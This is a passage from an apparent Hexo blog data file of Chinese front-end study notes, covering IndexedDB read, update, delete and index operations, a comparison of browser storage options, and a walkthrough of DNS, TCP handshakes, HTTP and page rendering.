IDBCursor。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function readAll() &#123;</span><br><span class=\"line\">  var objectStore = db.transaction(&#x27;person&#x27;).objectStore(&#x27;person&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">   objectStore.openCursor().onsuccess = function (event) &#123;</span><br><span class=\"line\">     var cursor = event.target.result;</span><br><span class=\"line\"></span><br><span class=\"line\">     if (cursor) &#123;</span><br><span class=\"line\">       console.log(&#x27;Id: &#x27; + cursor.key);</span><br><span class=\"line\">       console.log(&#x27;Name: &#x27; + cursor.value.name);</span><br><span class=\"line\">       console.log(&#x27;Age: &#x27; + cursor.value.age);</span><br><span class=\"line\">       console.log(&#x27;Email: &#x27; + cursor.value.email);</span><br><span class=\"line\">       cursor.continue();</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">      console.log(&#x27;没有更多数据了！&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">readAll();</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，新建指针对象的<strong>openCursor()方法</strong>是一个异步操作，所以要监听 success 事件。</p>\n<h4 id=\"3-6-更新数据\"><a href=\"#3-6-更新数据\" class=\"headerlink\" title=\"3.6.更新数据\"></a>3.6.更新数据</h4><p>更新数据要使用<strong>IDBObject.put()方法</strong>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function update() &#123;</span><br><span class=\"line\">  var request = db.transaction([&#x27;person&#x27;], &#x27;readwrite&#x27;)</span><br><span class=\"line\">    .objectStore(&#x27;person&#x27;)</span><br><span class=\"line\">    .put(&#123; id: 1, name: &#x27;李四&#x27;, age: 35, email: &#x27;lisi@example.com&#x27; &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  request.onsuccess = function (event) &#123;</span><br><span class=\"line\">    console.log(&#x27;数据更新成功&#x27;);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  request.onerror = function (event) &#123;</span><br><span class=\"line\">    console.log(&#x27;数据更新失败&#x27;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">update();</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，put()方法自动更新了主键为 1 的记录。</p>\n<h4 id=\"3-7-删除数据\"><a href=\"#3-7-删除数据\" class=\"headerlink\" title=\"3.7.删除数据\"></a>3.7.删除数据</h4><p><strong>IDBObjectStore.delete()方法</strong>用于删除记录。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function remove() &#123;</span><br><span class=\"line\">  var request = db.transaction([&#x27;person&#x27;], &#x27;readwrite&#x27;)</span><br><span class=\"line\">    .objectStore(&#x27;person&#x27;)</span><br><span class=\"line\">    .delete(1);</span><br><span class=\"line\"></span><br><span class=\"line\">  request.onsuccess = function (event) &#123;</span><br><span class=\"line\">    console.log(&#x27;数据删除成功&#x27;);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">remove();</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-8-使用索引\"><a href=\"#3-8-使用索引\" class=\"headerlink\" title=\"3.8.使用索引\"></a>3.8.使用索引</h4><p>索引的意义在于，可以让你搜索任意字段，也就是说从任意字段拿到数据记录。如果不建立索引，默认只能搜索主键（即从主键取值）。</p>\n<p>假定新建表格的时候，对 name 字段建立了索引。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">objectStore.createIndex(&#x27;name&#x27;, &#x27;name&#x27;, &#123; unique: false &#125;);</span><br></pre></td></tr></table></figure>\n\n<p>现在，就可以从 name 找到对应的数据记录了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var transaction = db.transaction([&#x27;person&#x27;], &#x27;readonly&#x27;);</span><br><span class=\"line\">var store = transaction.objectStore(&#x27;person&#x27;);</span><br><span class=\"line\">var index = store.index(&#x27;name&#x27;);</span><br><span class=\"line\">var request = index.get(&#x27;李四&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">request.onsuccess = function (e) &#123;</span><br><span class=\"line\">  var result = e.target.result;</span><br><span class=\"line\">  if (result) &#123;</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关闭-IndexDB\"><a href=\"#关闭-IndexDB\" class=\"headerlink\" title=\"关闭 IndexDB\"></a>关闭 IndexDB</h3><p><strong>indexdb.close()</strong></p>\n<h2 id=\"3-WebStorage、cookie-和-IndexedDB-之间的区别\"><a href=\"#3-WebStorage、cookie-和-IndexedDB-之间的区别\" class=\"headerlink\" title=\"3.WebStorage、cookie 和 IndexedDB 之间的区别\"></a>3.WebStorage、cookie 和 IndexedDB 之间的区别</h2><table>\n<thead>\n<tr>\n<th>特性</th>\n<th align=\"left\">cookie</th>\n<th align=\"left\">localstorage</th>\n<th align=\"left\">sessionstorage</th>\n<th align=\"left\">indexDB</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>数据生命周期</td>\n<td align=\"left\">一般有服务器生成，可以设置过期时间</td>\n<td align=\"left\">除非被清除，否则一直存在</td>\n<td align=\"left\">页面关闭就清理</td>\n<td align=\"left\">除非被清除，否则一直存在</td>\n</tr>\n<tr>\n<td>数据存储大小</td>\n<td align=\"left\">4K</td>\n<td align=\"left\">5M</td>\n<td align=\"left\">5M</td>\n<td align=\"left\">无限</td>\n</tr>\n<tr>\n<td>与服务端通信</td>\n<td align=\"left\">每次都会携带在 header 里，对于性能有很大影响</td>\n<td align=\"left\">不参与</td>\n<td align=\"left\">不参与</td>\n<td align=\"left\">不参与</td>\n</tr>\n</tbody></table>\n<p>从上表可以看到，cookie 已经不建议用于存储。如果没有大量数据存储需求的话，可以使用 localStorage 和 sessionStorage 。对于不怎么改变的数据尽量使用 localStorage 存储，否则可以用 sessionStorage 存储。</p>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><p>正是浏览器存储、缓存技术的出现和发展，为我们的前端应用带来了无限的转机。近年来基于存储、缓存技术的第三方库层出不绝，此外还衍生出了 PWA 这样优秀的 Web 应用模型。总结下本文几个核心观点：</p>\n<ul>\n<li>Cookie 的本职工作并非本地存储，而是“维持状态”</li>\n<li>Web Storage 是 HTML5 专门为浏览器存储而提供的数据存储机制，不与服务端发生通信</li>\n<li>IndexedDB 用于客户端存储大量结构化数据</li>\n</ul>\n"},{"title":"在地址栏输入URL到页面展示过程中，到底发生了什么？","date":"2019-04-02T01:49:41.000Z","_content":"\n# 前言\n\n## TCP/IP 协议族\n\nHTTP(HyperText Transfer Protocol,超文本传输协议)\n**TCP/IP 协议族**，按层次分：\n\n- 应用层\n  HTTP(HyperText Transfer Protocol,超文本传输协议)\n  FTP(File Transfer Protocal,文件传输协议)\n  DNS(Domain Name System,域名系统)\n\n- 传输层\n  TCP(Transmission Control Protocal,传输控制协议)\n  UDP(User Data Protocal,用户数据报协议)\n\n- 网络层\n  IP(Internet Protocal,互联网协议)（IP 地址----ARP 协议----MAC 地址）\n\n- 数据链路层\n  控制操作系统\n  硬件设备驱动\n  NIC(Network Interface Card,网络适配器，即网卡)\n  光纤\n\n# 在地址栏输入 URL 到页面展示过程中，到底发生了什么？\n\n![url](在地址栏输入URL到页面展示过程中，到底发生了什么？/url.jpg)\n\n## 过程如下：\n\n- DNS 解析：将域名解析为 IP\n\n- TCP 连接：TCP 三次握手\n\n- 发送 HTTP 请求\n\n- 服务器处理请求并返回 HTTP 报文\n\n- 浏览器解析渲染页面\n\n# DNS 解析\n\n## URI（统一资源标识符）\n\n![uri](在地址栏输入URL到页面展示过程中，到底发生了什么？/uri.jpg)\n\n## URL（统一资源定位符）\n\nURL（Uniform Resource Locator），统一资源定位符，用于定位互联网上资源，俗称网址。 比如 http://www.w3school.com.cn/html/index.asp，遵守以下的语法规则：\n\n**scheme://host.domain:port/path/filename** 各部分解释如下：\n\n- scheme - 定义因特网服务的类型。常见的协议有 http、https、ftp、file，其中最常见的类型是 http，而 https 则是进行加密的网络传输。\n- host - 定义域主机（http 的默认主机是 www）\n- domain - 定义因特网域名，比如 w3school.com.cn\n- port - 定义主机上的端口号（http 的默认端口号是 80）\n- path - 定义服务器上的路径（如果省略，则文档必须位于网站的根目录中）。\n- filename - 定义文档/资源的名称\n\n## DNS（Domain Name System，域名系统）\n\n域名系统（英文：DomainNameSystem，缩写：DNS）是互联网的一项服务。它作为将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网\n\n- 第一步：客户机提出域名解析请求,并将该请求发送给本地的域名服务器.\n- 第二步：当本地的域名服务器收到请求后,就先查询本地的缓存,如果有该纪录项,则本地的域名服务器就直接把查询的结果返回.\n- 第三步：如果本地的缓存中没有该纪录,则本地域名服务器就直接把请求发给根域名服务器,然后根域名服务器再返回给本地域名服务器一个所查询域(根的子域)的主域名服务器的地址.\n- 第四步：本地服务器再向上一步返回的域名服务器发送请求,然后接受请求的服务器查询自己的缓存,如果没有该纪录,则返回相关的下级的域名服务器的地址.\n- 第五步：重复第四步,直到找到正确的纪录.\n- 第六步：本地域名服务器把返回的结果保存到缓存,以备下一次使用,同时还将结果返回给客户机\n\n## IP 地址 （Internet Protocol Address，网际协议地址）\n\nIP 地址是指互联网协议地址，是 IP Address 的缩写。IP 地址是 IP 协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。IP 地址是一个 32 位的二进制数，比如 127.0.0.1 为本机 IP。域名就相当于 IP 地址乔装打扮的伪装者，带着一副面具。它的作用就是便于记忆和沟通的一组服务器的地址。用户通常使用主机名或域名来访问对方的计算机，而不是直接通过 IP 地址访问。因为与 IP 地址的一组纯数字相比，用字母配合数字的表示形式来指定计算机名更符合人类的记忆习惯。但要让计算机去理解名称，相对而言就变得困难了。因为计算机更擅长处理一长串数字。为了解决上述的问题，DNS 服务应运而生。\n\n## DNS 服务\n\nDNS 服务是和 HTTP 协议一样的应用层的协议，他提供域名到 IP 地址见的解析服务。\n计算机即可以被赋予 IP 地址，如：127.0.0.1，也可以被赋予主机名和域名。比如：www.hackr.jp\n用户通常使用主机名和域名来访问对方的计算机，而不是通过 IP 地址访问。因为 IP 是由一组纯数字，不太符合人类的记忆习惯。\n但是让计算机去理解主机名和域名就比较困难，因为计算机更擅长处理一长串数字。\n为了解决上述问题，DNS 服务就应运而生了。DNS 协议提供通过域名查找 IP 地址，或者逆向通过 IP 地址反查找域名的服务。\n![dns](在地址栏输入URL到页面展示过程中，到底发生了什么？/dns.jpg)\n\n## 浏览器如何通过域名去查询 URL 对应的 IP 呢\n\n- 浏览器缓存：浏览器会按照一定的频率缓存 DNS 记录。\n- 操作系统缓存：如果浏览器缓存中找不到需要的 DNS 记录，那就去操作系统中找。\n- 路由缓存：路由器也有 DNS 缓存。\n- ISP 的 DNS 服务器：ISP 是互联网服务提供商(Internet Service Provider)的简称，ISP 有专门的 DNS 服务器应对 DNS 查询请求。\n- 根服务器：ISP 的 DNS 服务器还找不到的话，它就会向根服务器发出请求，进行递归查询（DNS 服务器先问根域名服务器.com 域名服务器的 IP 地址，然后再问.baidu 域名服务器，依次类推）\n\n# TCP（Transmission Control Protocol，传输控制协议）\n\n**三次握手**\n\n- 第一次握手：建立连接时，客户端发送 syn 包（syn=j）到服务器，并进入 SYN_SENT 状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。\n- 第二次握手：服务器收到 syn 包，必须确认客户的 SYN（ack=j+1），同时自己也发送一个 SYN 包（syn=k），即 SYN+ACK 包，此时服务器进入 SYN_RECV 状态；\n- 第三次握手：客户端收到服务器的 SYN+ACK 包，向服务器发送确认包 ACK(ack=k+1），此包发送完毕，客户端和服务器进入 ESTABLISHED（TCP 连接成功）状态，完成三次握手。\n  ![tcp](在地址栏输入URL到页面展示过程中，到底发生了什么？/tcp.jpg)\n\n# 发送 HTTP 请求\n\n![http2](在地址栏输入URL到页面展示过程中，到底发生了什么？/http2.jpg)\n\nHTTP 请求分为三个部分：\n\n- TCP 三次握手\n  ![tcp](在地址栏输入URL到页面展示过程中，到底发生了什么？/tcp.jpg)\n- http 请求响应信息\n- 关闭 TCP 连接。\n  ![tcp2](在地址栏输入URL到页面展示过程中，到底发生了什么？/tcp2.jpg)\n  请求头\n  ![request](在地址栏输入URL到页面展示过程中，到底发生了什么？/request.jpg)\n\n客户端发送 http 请求，服务端返回响应\n![req_res](在地址栏输入URL到页面展示过程中，到底发生了什么？/req_res.jpg)\n\n# 服务器处理请求并返回 HTTP 报文\n\n响应头\n![response](在地址栏输入URL到页面展示过程中，到底发生了什么？/response.jpg)\n\n# 浏览器解析渲染页面\n\n浏览器解析渲染页面分为一下五个步骤：\n\n- 根据 HTML 解析出 DOM 树\n- 根据 CSS 解析生成 CSS 规则树\n- 结合 DOM 树和 CSS 规则树，生成渲染树\n- 根据渲染树计算每一个节点的信息\n- 根据计算好的信息绘制页面\n\n![html](在地址栏输入URL到页面展示过程中，到底发生了什么？/html.jpg)\n\n## 1.根据 HTML 解析 DOM 树\n\n- 根据 HTML 的内容，将标签按照结构解析成为 DOM 树，DOM 树解析的过程是一个深度优先遍历。即先构建当前节点的所有子节点，再构建下一个兄弟节点。\n- 在读取 HTML 文档，构建 DOM 树的过程中，若遇到 script 标签，则 DOM 树的构建会暂停，直至脚本执行完毕。\n\n## 2.根据 CSS 解析生成 CSS 规则树\n\n- 解析 CSS 规则树时 js 执行将暂停，直至 CSS 规则树就绪。\n- 浏览器在 CSS 规则树生成之前不会进行渲染。\n\n## 3.结合 DOM 树和 CSS 规则树，生成渲染树\n\n- DOM 树和 CSS 规则树全部准备好了以后，浏览器才会开始构建渲染树。\n- 精简 CSS 并可以加快 CSS 规则树的构建，从而加快页面相应速度。\n\n## 4.根据渲染树计算每一个节点的信息（布局）\n\n- 布局：通过渲染树中渲染对象的信息，计算出每一个渲染对象的位置和尺寸\n- 回流：在布局完成后，发现了某个部分发生了变化影响了布局，那就需要倒回去重新渲染。\n\n## 5.根据计算好的信息绘制页面\n\n- 绘制阶段，系统会遍历呈现树，并调用呈现器的“paint”方法，将呈现器的内容显示在屏幕上。\n- 重绘：某个元素的背景颜色，文字颜色等，不影响元素周围或内部布局的属性，将只会引起浏览器的重绘。\n- 回流：某个元素的尺寸发生了变化，则需重新计算渲染树，重新渲染。\n\n<!-- # TCP四次挥手 -->\n\n#### 参考资料\n\n[图解 HTTP](https://book.douban.com/subject/25863515/)\n","source":"_posts/在地址栏输入URL到页面展示过程中，到底发生了什么？.md","raw":"---\ntitle: 在地址栏输入URL到页面展示过程中，到底发生了什么？\ndate: 2019-04-02 09:49:41\ntags:\n  - 笔记\n---\n\n# 前言\n\n## TCP/IP 协议族\n\nHTTP(HyperText Transfer Protocol,超文本传输协议)\n**TCP/IP 协议族**，按层次分：\n\n- 应用层\n  HTTP(HyperText Transfer Protocol,超文本传输协议)\n  FTP(File Transfer Protocal,文件传输协议)\n  DNS(Domain Name System,域名系统)\n\n- 传输层\n  TCP(Transmission Control Protocal,传输控制协议)\n  UDP(User Data Protocal,用户数据报协议)\n\n- 网络层\n  IP(Internet Protocal,互联网协议)（IP 地址----ARP 协议----MAC 地址）\n\n- 数据链路层\n  控制操作系统\n  硬件设备驱动\n  NIC(Network Interface Card,网络适配器，即网卡)\n  光纤\n\n# 在地址栏输入 URL 到页面展示过程中，到底发生了什么？\n\n![url](在地址栏输入URL到页面展示过程中，到底发生了什么？/url.jpg)\n\n## 过程如下：\n\n- DNS 解析：将域名解析为 IP\n\n- TCP 连接：TCP 三次握手\n\n- 发送 HTTP 请求\n\n- 服务器处理请求并返回 HTTP 报文\n\n- 浏览器解析渲染页面\n\n# DNS 解析\n\n## URI（统一资源标识符）\n\n![uri](在地址栏输入URL到页面展示过程中，到底发生了什么？/uri.jpg)\n\n## URL（统一资源定位符）\n\nURL（Uniform Resource Locator），统一资源定位符，用于定位互联网上资源，俗称网址。 比如 http://www.w3school.com.cn/html/index.asp，遵守以下的语法规则：\n\n**scheme://host.domain:port/path/filename** 各部分解释如下：\n\n- scheme - 定义因特网服务的类型。常见的协议有 http、https、ftp、file，其中最常见的类型是 http，而 https 则是进行加密的网络传输。\n- host - 定义域主机（http 的默认主机是 www）\n- domain - 定义因特网域名，比如 w3school.com.cn\n- port - 定义主机上的端口号（http 的默认端口号是 80）\n- path - 定义服务器上的路径（如果省略，则文档必须位于网站的根目录中）。\n- filename - 定义文档/资源的名称\n\n## DNS（Domain Name System，域名系统）\n\n域名系统（英文：DomainNameSystem，缩写：DNS）是互联网的一项服务。它作为将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网\n\n- 第一步：客户机提出域名解析请求,并将该请求发送给本地的域名服务器.\n- 第二步：当本地的域名服务器收到请求后,就先查询本地的缓存,如果有该纪录项,则本地的域名服务器就直接把查询的结果返回.\n- 第三步：如果本地的缓存中没有该纪录,则本地域名服务器就直接把请求发给根域名服务器,然后根域名服务器再返回给本地域名服务器一个所查询域(根的子域)的主域名服务器的地址.\n- 第四步：本地服务器再向上一步返回的域名服务器发送请求,然后接受请求的服务器查询自己的缓存,如果没有该纪录,则返回相关的下级的域名服务器的地址.\n- 第五步：重复第四步,直到找到正确的纪录.\n- 第六步：本地域名服务器把返回的结果保存到缓存,以备下一次使用,同时还将结果返回给客户机\n\n## IP 地址 （Internet Protocol Address，网际协议地址）\n\nIP 地址是指互联网协议地址，是 IP Address 的缩写。IP 地址是 IP 协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。IP 地址是一个 32 位的二进制数，比如 127.0.0.1 为本机 IP。域名就相当于 IP 地址乔装打扮的伪装者，带着一副面具。它的作用就是便于记忆和沟通的一组服务器的地址。用户通常使用主机名或域名来访问对方的计算机，而不是直接通过 IP 地址访问。因为与 IP 地址的一组纯数字相比，用字母配合数字的表示形式来指定计算机名更符合人类的记忆习惯。但要让计算机去理解名称，相对而言就变得困难了。因为计算机更擅长处理一长串数字。为了解决上述的问题，DNS 服务应运而生。\n\n## DNS 服务\n\nDNS 服务是和 HTTP 协议一样的应用层的协议，他提供域名到 IP 地址见的解析服务。\n计算机即可以被赋予 IP 地址，如：127.0.0.1，也可以被赋予主机名和域名。比如：www.hackr.jp\n用户通常使用主机名和域名来访问对方的计算机，而不是通过 IP 地址访问。因为 IP 是由一组纯数字，不太符合人类的记忆习惯。\n但是让计算机去理解主机名和域名就比较困难，因为计算机更擅长处理一长串数字。\n为了解决上述问题，DNS 服务就应运而生了。DNS 协议提供通过域名查找 IP 地址，或者逆向通过 IP 地址反查找域名的服务。\n![dns](在地址栏输入URL到页面展示过程中，到底发生了什么？/dns.jpg)\n\n## 浏览器如何通过域名去查询 URL 对应的 IP 呢\n\n- 浏览器缓存：浏览器会按照一定的频率缓存 DNS 记录。\n- 操作系统缓存：如果浏览器缓存中找不到需要的 DNS 记录，那就去操作系统中找。\n- 路由缓存：路由器也有 DNS 缓存。\n- ISP 的 DNS 服务器：ISP 是互联网服务提供商(Internet Service Provider)的简称，ISP 有专门的 DNS 服务器应对 DNS 查询请求。\n- 根服务器：ISP 的 DNS 服务器还找不到的话，它就会向根服务器发出请求，进行递归查询（DNS 服务器先问根域名服务器.com 域名服务器的 IP 地址，然后再问.baidu 域名服务器，依次类推）\n\n# TCP（Transmission Control Protocol，传输控制协议）\n\n**三次握手**\n\n- 第一次握手：建立连接时，客户端发送 syn 包（syn=j）到服务器，并进入 SYN_SENT 状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。\n- 第二次握手：服务器收到 syn 包，必须确认客户的 SYN（ack=j+1），同时自己也发送一个 SYN 包（syn=k），即 SYN+ACK 包，此时服务器进入 SYN_RECV 状态；\n- 第三次握手：客户端收到服务器的 SYN+ACK 包，向服务器发送确认包 ACK(ack=k+1），此包发送完毕，客户端和服务器进入 ESTABLISHED（TCP 连接成功）状态，完成三次握手。\n  ![tcp](在地址栏输入URL到页面展示过程中，到底发生了什么？/tcp.jpg)\n\n# 发送 HTTP 请求\n\n![http2](在地址栏输入URL到页面展示过程中，到底发生了什么？/http2.jpg)\n\nHTTP 请求分为三个部分：\n\n- TCP 三次握手\n  ![tcp](在地址栏输入URL到页面展示过程中，到底发生了什么？/tcp.jpg)\n- http 请求响应信息\n- 关闭 TCP 连接。\n  ![tcp2](在地址栏输入URL到页面展示过程中，到底发生了什么？/tcp2.jpg)\n  请求头\n  ![request](在地址栏输入URL到页面展示过程中，到底发生了什么？/request.jpg)\n\n客户端发送 http 请求，服务端返回响应\n![req_res](在地址栏输入URL到页面展示过程中，到底发生了什么？/req_res.jpg)\n\n# 服务器处理请求并返回 HTTP 报文\n\n响应头\n![response](在地址栏输入URL到页面展示过程中，到底发生了什么？/response.jpg)\n\n# 浏览器解析渲染页面\n\n浏览器解析渲染页面分为一下五个步骤：\n\n- 根据 HTML 解析出 DOM 树\n- 根据 CSS 解析生成 CSS 规则树\n- 结合 DOM 树和 CSS 规则树，生成渲染树\n- 根据渲染树计算每一个节点的信息\n- 根据计算好的信息绘制页面\n\n![html](在地址栏输入URL到页面展示过程中，到底发生了什么？/html.jpg)\n\n## 1.根据 HTML 解析 DOM 树\n\n- 根据 HTML 的内容，将标签按照结构解析成为 DOM 树，DOM 树解析的过程是一个深度优先遍历。即先构建当前节点的所有子节点，再构建下一个兄弟节点。\n- 在读取 HTML 文档，构建 DOM 树的过程中，若遇到 script 标签，则 DOM 树的构建会暂停，直至脚本执行完毕。\n\n## 2.根据 CSS 解析生成 CSS 规则树\n\n- 解析 CSS 规则树时 js 执行将暂停，直至 CSS 规则树就绪。\n- 浏览器在 CSS 规则树生成之前不会进行渲染。\n\n## 3.结合 DOM 树和 CSS 规则树，生成渲染树\n\n- DOM 树和 CSS 规则树全部准备好了以后，浏览器才会开始构建渲染树。\n- 精简 CSS 并可以加快 CSS 规则树的构建，从而加快页面相应速度。\n\n## 4.根据渲染树计算每一个节点的信息（布局）\n\n- 布局：通过渲染树中渲染对象的信息，计算出每一个渲染对象的位置和尺寸\n- 回流：在布局完成后，发现了某个部分发生了变化影响了布局，那就需要倒回去重新渲染。\n\n## 5.根据计算好的信息绘制页面\n\n- 绘制阶段，系统会遍历呈现树，并调用呈现器的“paint”方法，将呈现器的内容显示在屏幕上。\n- 重绘：某个元素的背景颜色，文字颜色等，不影响元素周围或内部布局的属性，将只会引起浏览器的重绘。\n- 回流：某个元素的尺寸发生了变化，则需重新计算渲染树，重新渲染。\n\n<!-- # TCP四次挥手 -->\n\n#### 参考资料\n\n[图解 HTTP](https://book.douban.com/subject/25863515/)\n","slug":"在地址栏输入URL到页面展示过程中，到底发生了什么？","published":1,"updated":"2022-02-23T03:09:02.884Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckzz950cy000en0w19emt9imz","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><h2 id=\"TCP-IP-协议族\"><a href=\"#TCP-IP-协议族\" class=\"headerlink\" title=\"TCP/IP 协议族\"></a>TCP/IP 协议族</h2><p>HTTP(HyperText Transfer Protocol,超文本传输协议)<br><strong>TCP/IP 协议族</strong>，按层次分：</p>\n<ul>\n<li><p>应用层<br>HTTP(HyperText Transfer Protocol,超文本传输协议)<br>FTP(File Transfer Protocal,文件传输协议)<br>DNS(Domain Name System,域名系统)</p>\n</li>\n<li><p>传输层<br>TCP(Transmission Control Protocal,传输控制协议)<br>UDP(User Data Protocal,用户数据报协议)</p>\n</li>\n<li><p>网络层<br>IP(Internet Protocal,互联网协议)（IP 地址—-ARP 协议—-MAC 地址）</p>\n</li>\n<li><p>数据链路层<br>控制操作系统<br>硬件设备驱动<br>NIC(Network Interface Card,网络适配器，即网卡)<br>光纤</p>\n</li>\n</ul>\n<h1 id=\"在地址栏输入-URL-到页面展示过程中，到底发生了什么？\"><a href=\"#在地址栏输入-URL-到页面展示过程中，到底发生了什么？\" class=\"headerlink\" title=\"在地址栏输入 URL 到页面展示过程中，到底发生了什么？\"></a>在地址栏输入 URL 到页面展示过程中，到底发生了什么？</h1><p><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/url.jpg\" alt=\"url\"></p>\n<h2 id=\"过程如下：\"><a href=\"#过程如下：\" class=\"headerlink\" title=\"过程如下：\"></a>过程如下：</h2><ul>\n<li><p>DNS 解析：将域名解析为 IP</p>\n</li>\n<li><p>TCP 连接：TCP 三次握手</p>\n</li>\n<li><p>发送 HTTP 请求</p>\n</li>\n<li><p>服务器处理请求并返回 HTTP 报文</p>\n</li>\n<li><p>浏览器解析渲染页面</p>\n</li>\n</ul>\n<h1 id=\"DNS-解析\"><a href=\"#DNS-解析\" class=\"headerlink\" title=\"DNS 解析\"></a>DNS 解析</h1><h2 id=\"URI（统一资源标识符）\"><a href=\"#URI（统一资源标识符）\" class=\"headerlink\" title=\"URI（统一资源标识符）\"></a>URI（统一资源标识符）</h2><p><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/uri.jpg\" alt=\"uri\"></p>\n<h2 id=\"URL（统一资源定位符）\"><a href=\"#URL（统一资源定位符）\" class=\"headerlink\" title=\"URL（统一资源定位符）\"></a>URL（统一资源定位符）</h2><p>URL（Uniform Resource Locator），统一资源定位符，用于定位互联网上资源，俗称网址。 比如 <a href=\"http://www.w3school.com.cn/html/index.asp%EF%BC%8C%E9%81%B5%E5%AE%88%E4%BB%A5%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E8%A7%84%E5%88%99%EF%BC%9A\">http://www.w3school.com.cn/html/index.asp，遵守以下的语法规则：</a></p>\n<p><strong>scheme://host.domain:port/path/filename</strong> 各部分解释如下：</p>\n<ul>\n<li>scheme - 定义因特网服务的类型。常见的协议有 http、https、ftp、file，其中最常见的类型是 http，而 https 则是进行加密的网络传输。</li>\n<li>host - 定义域主机（http 的默认主机是 www）</li>\n<li>domain - 定义因特网域名，比如 w3school.com.cn</li>\n<li>port - 定义主机上的端口号（http 的默认端口号是 80）</li>\n<li>path - 定义服务器上的路径（如果省略，则文档必须位于网站的根目录中）。</li>\n<li>filename - 定义文档/资源的名称</li>\n</ul>\n<h2 id=\"DNS（Domain-Name-System，域名系统）\"><a href=\"#DNS（Domain-Name-System，域名系统）\" class=\"headerlink\" title=\"DNS（Domain Name System，域名系统）\"></a>DNS（Domain Name System，域名系统）</h2><p>域名系统（英文：DomainNameSystem，缩写：DNS）是互联网的一项服务。它作为将域名和 IP 